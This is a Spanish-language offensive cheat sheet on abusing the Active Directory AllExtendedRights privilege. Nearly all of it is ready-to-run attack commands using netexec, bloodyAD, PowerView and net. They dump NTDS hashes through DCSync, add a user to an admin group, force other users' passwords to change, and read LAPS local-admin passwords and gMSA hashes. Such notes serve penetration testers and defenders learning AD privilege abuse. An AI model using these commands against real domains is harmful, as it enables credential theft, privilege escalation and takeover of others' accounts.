AllExtendedRights

AllExtendedRights puede habilitar acciones sensibles sobre objetos, incluyendo cambios de contraseña o permisos específicos según el tipo de objeto.

Info: AllExtendedRights: Dependiendo sobre que objetos tengamos este privilegio se nos dotará de algunos permisos u otros

Aviso: AllExtendedRights sobre Dominio DCSync

Comandos

# Ataque Kali: alvaro con permisos DCSync puede dumpear NTDS del DC
netexec smb <ip_dc> -u 'alvaro' -p 'alvaro' --ntds

Aviso: AllExtendedRights/AddSelf sobre Grupos WriteMember/AddMember

Comandos

# Ataque Windows: alvaro con permisos WriteMembers puede agregar a cualquier usuario al grupo "IT-Admins"
Add-DomainGroupMember -Identity "IT-Admins" -Members "lidia"
net group 'IT-Admins' 'lidia' /add /domain
# Ataque Kali
bloodyAD -u 'alvaro' -p 'alvaro123' -d <domain> --host <ip_dc> add groupMember 'IT-Admins' lidia

Aviso: AllExtendedRights sobre Usuarios ForceChangePassword/ResetPassword

Comandos

# Ataque Windows: alvaro puede forzar el cambio de contraseña en lidia
Set-DomainUserPassword -Identity "lidia" -AccountPassword (ConvertTo-SecureString "NuevaPass123" -AsPlainText -Force)
net user lidia NewPassword123 /domain
# Ataque Kali
nxc smb <dc_ip> -u 'alvaro' -p 'alvaro123' -M change-password -o USER=lidia NEWPASS='NewPass123'
bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' set password 'lidia' 'NewPass123'

Aviso: AllExtendedRights sobre Equipos

ReadLAPSPassword: Contraseña del Local Admin del equipo

Kali: Leer contraseña LAPS

bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
nxc ldap <ip_dc> -u 'alvaro' -p 'alvaro123' -M laps

ReadGMSAPassword: NT hash de Cuentas de Servicio del equipo

Kali: Leer contraseña GMSA

bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' get object 'TARGET' --attr msDS-ManagedPassword
nxc ldap <ip_dc> -u 'alvaro' -p 'alvaro123' --gmsa
